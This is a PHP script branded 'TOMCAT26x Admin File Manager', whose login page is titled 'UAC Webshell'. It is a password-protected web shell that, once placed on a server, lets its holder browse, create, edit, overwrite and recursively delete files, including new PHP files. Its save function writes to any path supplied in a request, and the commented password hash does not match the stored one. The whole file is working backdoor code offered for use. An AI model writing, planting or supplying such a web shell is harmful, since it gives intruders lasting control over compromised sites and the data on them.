<?php

/*
|--------------------------------------------------------------------------
| TOMCAT26x Admin File Manager
|--------------------------------------------------------------------------
| Features:
| - Login Protection
| - MD5 Password Authentication
| - Responsive UI
| - Black / Red / White Theme
| - Font Awesome Icons
| - File Manager
|--------------------------------------------------------------------------
*/

session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

/*
|--------------------------------------------------------------------------
| LOGIN CONFIG
|--------------------------------------------------------------------------
|
| Password: TOMCAT26x
| MD5: 2db4f7d9b5d9d869eb8f95b8e50e65e9
|
*/

$PASSWORD_HASH = "9e9775baf241e6e37c75eeaa02002271";

/*
|--------------------------------------------------------------------------
| LOGIN
|--------------------------------------------------------------------------
*/

if (isset($_POST['login'])) {

    $password = md5($_POST['password']);

    if ($password === $PASSWORD_HASH) {

        $_SESSION['admin_login'] = true;

        header("Location: " . $_SERVER['PHP_SELF']);
        exit;

    } else {

        $login_error = "Invalid password.";
    }
}

/*
|--------------------------------------------------------------------------
| LOGOUT
|--------------------------------------------------------------------------
*/

if (isset($_GET['logout'])) {

    session_destroy();

    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

/*
|--------------------------------------------------------------------------
| CHECK LOGIN
|--------------------------------------------------------------------------
*/

if (!isset($_SESSION['admin_login'])):
?>

<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>TOMCAT26x Login</title>

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#050505;
    font-family:Arial,sans-serif;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    color:#fff;
    padding:20px;
}

.login-box{
    width:100%;
    max-width:420px;
    background:#0f0f0f;
    border:1px solid #1d1d1d;
    border-radius:20px;
    padding:35px;
    box-shadow:0 0 40px rgba(255,0,0,0.1);
}

.logo{
    text-align:center;
    margin-bottom:30px;
}

.logo i{
    font-size:55px;
    color:#ff2b2b;
    margin-bottom:15px;
}

.logo h1{
    font-size:30px;
    color:#ff2b2b;
}

.logo p{
    color:#888;
    margin-top:8px;
}

input{
    width:100%;
    padding:15px;
    background:#090909;
    border:1px solid #222;
    border-radius:12px;
    color:#fff;
    margin-bottom:18px;
    outline:none;
}

input:focus{
    border-color:#ff2b2b;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:12px;
    background:#ff2b2b;
    color:#fff;
    cursor:pointer;
    font-size:15px;
    transition:0.2s;
}

button:hover{
    background:#d91f1f;
}

.error{
    background:#220909;
    border:1px solid #5e1111;
    padding:14px;
    border-radius:12px;
    margin-bottom:18px;
    color:#ff6b6b;
}

</style>

</head>

<body>

<div class="login-box">

    <div class="logo">

        <i class="fa-solid fa-shield-halved"></i>

        <h1>UAC Webshell</h1>

        <p>Admin File Manager</p>

    </div>

    <?php if(isset($login_error)): ?>

        <div class="error">
            <?php echo $login_error; ?>
        </div>

    <?php endif; ?>

    <form method="POST">

        <input
            type="password"
            name="password"
            placeholder="Enter Password"
            required
        >

        <button type="submit" name="login">
            <i class="fa-solid fa-right-to-bracket"></i>
            Login
        </button>

    </form>

</div>

</body>
</html>

<?php
exit;
endif;

/*
|--------------------------------------------------------------------------
| FILE MANAGER
|--------------------------------------------------------------------------
*/

$basePath = __DIR__;

$currentPath = isset($_GET['path'])
    ? realpath($_GET['path'])
    : $basePath;

if ($currentPath === false || strpos($currentPath, $basePath) !== 0) {
    $currentPath = $basePath;
}

$message = "";

/*
|--------------------------------------------------------------------------
| HELPERS
|--------------------------------------------------------------------------
*/

function formatSize($bytes)
{
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    }

    return $bytes . ' B';
}

function deleteRecursive($path)
{
    if (is_file($path)) {
        return unlink($path);
    }

    if (is_dir($path)) {

        $items = scandir($path);

        foreach ($items as $item) {

            if ($item === "." || $item === "..") {
                continue;
            }

            deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
        }

        return rmdir($path);
    }

    return false;
}

/*
|--------------------------------------------------------------------------
| CREATE FILE
|--------------------------------------------------------------------------
*/

if (isset($_POST['create_file'])) {

    $filename = trim($_POST['filename']);

    if (!empty($filename)) {

        $file = $currentPath . DIRECTORY_SEPARATOR . $filename;

        if (!file_exists($file)) {

            file_put_contents($file, "");
            $message = "File created successfully.";

        } else {

            $message = "File already exists.";
        }
    }
}

/*
|--------------------------------------------------------------------------
| CREATE FOLDER
|--------------------------------------------------------------------------
*/

if (isset($_POST['create_folder'])) {

    $foldername = trim($_POST['foldername']);

    if (!empty($foldername)) {

        $folder = $currentPath . DIRECTORY_SEPARATOR . $foldername;

        if (!file_exists($folder)) {

            mkdir($folder, 0777, true);
            $message = "Folder created successfully.";

        } else {

            $message = "Folder already exists.";
        }
    }
}

/*
|--------------------------------------------------------------------------
| SAVE FILE
|--------------------------------------------------------------------------
*/

if (isset($_POST['save_file'])) {

    $file = $_POST['file'];

    if (file_exists($file) && is_file($file)) {

        file_put_contents($file, $_POST['content']);
        $message = "File saved successfully.";
    }
}

/*
|--------------------------------------------------------------------------
| DELETE
|--------------------------------------------------------------------------
*/

if (isset($_GET['delete'])) {

    $target = $_GET['delete'];

    if (strpos(realpath($target), $basePath) === 0) {

        deleteRecursive($target);
        $message = "Deleted successfully.";
    }
}

$items = scandir($currentPath);

?>

<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>TOMCAT26x Admin</title>

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#050505;
    color:#fff;
    font-family:Arial,sans-serif;
    padding:20px;
}

.container{
    max-width:1450px;
    margin:auto;
}

/*
|--------------------------------------------------------------------------
| TOPBAR
|--------------------------------------------------------------------------
*/

.topbar{
    display:flex;
    justify-content:space-between;
    align-items:center;
    flex-wrap:wrap;
    gap:15px;
    margin-bottom:25px;
}

.logo{
    display:flex;
    align-items:center;
    gap:15px;
}

.logo i{
    color:#ff2b2b;
    font-size:30px;
}

.logo h1{
    color:#ff2b2b;
    font-size:28px;
}

/*
|--------------------------------------------------------------------------
| BUTTONS
|--------------------------------------------------------------------------
*/

.btn{
    display:inline-flex;
    align-items:center;
    gap:8px;
    padding:12px 16px;
    border-radius:12px;
    border:none;
    cursor:pointer;
    text-decoration:none;
    color:#fff;
    transition:0.2s;
    font-size:14px;
}

.btn-red{
    background:#ff2b2b;
}

.btn-red:hover{
    background:#d61f1f;
}

.btn-dark{
    background:#151515;
}

.btn-dark:hover{
    background:#222;
}

.btn-delete{
    background:#920909;
}

.btn-delete:hover{
    background:#730606;
}

/*
|--------------------------------------------------------------------------
| INFO
|--------------------------------------------------------------------------
*/

.path-box,
.alert{
    background:#0f0f0f;
    border:1px solid #1f1f1f;
    border-radius:16px;
    padding:16px;
    margin-bottom:22px;
    overflow:auto;
}

.alert{
    border-left:4px solid #ff2b2b;
}

/*
|--------------------------------------------------------------------------
| GRID
|--------------------------------------------------------------------------
*/

.grid{
    display:grid;
    grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
    gap:20px;
    margin-bottom:30px;
}

.card{
    background:#0f0f0f;
    border:1px solid #1f1f1f;
    border-radius:18px;
    padding:22px;
}

.card h2{
    color:#ff2b2b;
    margin-bottom:18px;
}

/*
|--------------------------------------------------------------------------
| FORM
|--------------------------------------------------------------------------
*/

input,
textarea{
    width:100%;
    background:#080808;
    border:1px solid #1d1d1d;
    color:#fff;
    border-radius:12px;
    padding:14px;
    margin-bottom:14px;
    outline:none;
}

input:focus,
textarea:focus{
    border-color:#ff2b2b;
}

textarea{
    min-height:550px;
    resize:vertical;
    font-family:monospace;
}

/*
|--------------------------------------------------------------------------
| TABLE
|--------------------------------------------------------------------------
*/

.table-wrapper{
    overflow:auto;
    border-radius:18px;
    border:1px solid #1f1f1f;
}

table{
    width:100%;
    border-collapse:collapse;
    min-width:900px;
    background:#0c0c0c;
}

thead{
    background:#111;
}

th{
    color:#ff2b2b;
    font-size:13px;
    text-transform:uppercase;
    letter-spacing:1px;
}

th,
td{
    padding:18px;
    border-bottom:1px solid #161616;
    text-align:left;
}

tr:hover{
    background:#101010;
}

.file{
    display:flex;
    align-items:center;
    gap:12px;
}

.file i{
    color:#ff2b2b;
    width:20px;
}

.file a{
    color:#fff;
    text-decoration:none;
}

.file a:hover{
    color:#ff2b2b;
}

/*
|--------------------------------------------------------------------------
| RESPONSIVE
|--------------------------------------------------------------------------
*/

@media(max-width:768px){

    body{
        padding:12px;
    }

    .logo h1{
        font-size:22px;
    }

    .btn{
        width:100%;
        justify-content:center;
    }

    th,
    td{
        padding:14px;
    }

    textarea{
        min-height:400px;
    }
}

</style>

</head>

<body>

<div class="container">

    <div class="topbar">

        <div class="logo">

            <i class="fa-solid fa-shield-halved"></i>

            <h1>TOMCAT26x</h1>

        </div>

        <div style="display:flex; gap:10px; flex-wrap:wrap;">

            <?php
            $parent = dirname($currentPath);

            if ($currentPath !== $basePath):
            ?>

            <a
                href="?path=<?php echo urlencode($parent); ?>"
                class="btn btn-dark"
            >
                <i class="fa-solid fa-arrow-left"></i>
                Back
            </a>

            <?php endif; ?>

            <a
                href="?logout"
                class="btn btn-delete"
            >
                <i class="fa-solid fa-right-from-bracket"></i>
                Logout
            </a>

        </div>

    </div>

    <div class="path-box">

        <strong>Current Path:</strong><br><br>

        <?php echo htmlspecialchars($currentPath); ?>

    </div>

    <?php if(!empty($message)): ?>

        <div class="alert">
            <?php echo htmlspecialchars($message); ?>
        </div>

    <?php endif; ?>

    <!-- CREATE -->

    <div class="grid">

        <div class="card">

            <h2>Create File</h2>

            <form method="POST">

                <input
                    type="text"
                    name="filename"
                    placeholder="example.php"
                    required
                >

                <button
                    type="submit"
                    name="create_file"
                    class="btn btn-red"
                >
                    <i class="fa-solid fa-file-circle-plus"></i>
                    Create File
                </button>

            </form>

        </div>

        <div class="card">

            <h2>Create Folder</h2>

            <form method="POST">

                <input
                    type="text"
                    name="foldername"
                    placeholder="New Folder"
                    required
                >

                <button
                    type="submit"
                    name="create_folder"
                    class="btn btn-red"
                >
                    <i class="fa-solid fa-folder-plus"></i>
                    Create Folder
                </button>

            </form>

        </div>

    </div>

    <!-- EDITOR -->

    <?php

    if (isset($_GET['edit'])):

        $editFile = $_GET['edit'];

        if (
            file_exists($editFile) &&
            is_file($editFile) &&
            strpos(realpath($editFile), $basePath) === 0
        ):

            $content = htmlspecialchars(file_get_contents($editFile));

    ?>

    <div class="card" style="margin-bottom:30px;">

        <h2>Edit File</h2>

        <form method="POST">

            <input
                type="hidden"
                name="file"
                value="<?php echo htmlspecialchars($editFile); ?>"
            >

            <textarea name="content"><?php echo $content; ?></textarea>

            <button
                type="submit"
                name="save_file"
                class="btn btn-red"
            >
                <i class="fa-solid fa-floppy-disk"></i>
                Save File
            </button>

        </form>

    </div>

    <?php endif; endif; ?>

    <!-- TABLE -->

    <div class="table-wrapper">

        <table>

            <thead>

                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>

            </thead>

            <tbody>

            <?php foreach($items as $item): ?>

                <?php

                if ($item === "." || $item === "..") {
                    continue;
                }

                $fullPath = $currentPath . DIRECTORY_SEPARATOR . $item;

                ?>

                <tr>

                    <td>

                        <div class="file">

                            <?php if(is_dir($fullPath)): ?>

                                <i class="fa-solid fa-folder"></i>

                                <a
                                    href="?path=<?php echo urlencode($fullPath); ?>"
                                >
                                    <?php echo htmlspecialchars($item); ?>
                                </a>

                            <?php else: ?>

                                <i class="fa-solid fa-file-lines"></i>

                                <?php echo htmlspecialchars($item); ?>

                            <?php endif; ?>

                        </div>

                    </td>

                    <td>
                        <?php echo is_dir($fullPath) ? "Directory" : "File"; ?>
                    </td>

                    <td>

                        <?php

                        echo is_file($fullPath)
                            ? formatSize(filesize($fullPath))
                            : "-";

                        ?>

                    </td>

                    <td>

                        <?php
                        echo substr(sprintf('%o', fileperms($fullPath)), -4);
                        ?>

                    </td>

                    <td style="display:flex; gap:10px; flex-wrap:wrap;">

                        <?php if(is_file($fullPath)): ?>

                            <a
                                class="btn btn-red"
                                href="?path=<?php echo urlencode($currentPath); ?>&edit=<?php echo urlencode($fullPath); ?>"
                            >
                                <i class="fa-solid fa-pen-to-square"></i>
                                Edit
                            </a>

                        <?php else: ?>

                            <a
                                class="btn btn-dark"
                                href="?path=<?php echo urlencode($fullPath); ?>"
                            >
                                <i class="fa-solid fa-folder-open"></i>
                                Open
                            </a>

                        <?php endif; ?>

                        <a
                            class="btn btn-delete"
                            href="?path=<?php echo urlencode($currentPath); ?>&delete=<?php echo urlencode($fullPath); ?>"
                            onclick="return confirm('Delete this item?')"
                        >
                            <i class="fa-solid fa-trash"></i>
                            Delete
                        </a>

                    </td>

                </tr>

            <?php endforeach; ?>

            </tbody>

        </table>

    </div>

</div>

</body>
</html>